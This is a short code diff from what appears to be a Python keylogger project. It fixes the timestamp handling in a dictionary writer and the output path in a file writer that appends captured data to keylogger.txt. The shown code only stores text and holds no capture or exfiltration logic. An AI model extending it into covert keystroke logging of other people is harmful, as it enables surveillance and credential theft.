@@ -22,16 +22,16 @@ class DictWriter(IWriter):
     def cur_min():
         return datetime.now().strftime("%d/%m/%Y, %H:%M")
 
-    def write(self, key: str) -> None:
-        if self.cur_min not in self.dct:
-            self.dct[self.cur_min] = key
+    def write(self, data: str) -> None:
+        if self.cur_min() not in self.dct:
+            self.dct[self.cur_min()] = data
         else:
-            self.dct[self.cur_min] += key
+            self.dct[self.cur_min()] += data
         
 # מחלקת כתיבה לקובץ טקסט
 class FileWriter(IWriter):
 
-    def __init__(self, path = "C:\Users\User\OneDrive\GitProjects\KeyloggerFile"):        
+    def __init__(self, path = "C:/Users/User/OneDrive/GitProjects/KeyloggerFile/keylogger.txt"):
         self.file_path = path
 
     def change_file_path(self, path: str) -> None:
@@ -39,4 +39,4 @@ class FileWriter(IWriter):
 
     def write(self, data: str) -> None:
         with open(self.file_path, "a") as file:
-            file.write(data)
+            file.write(data+"\n")
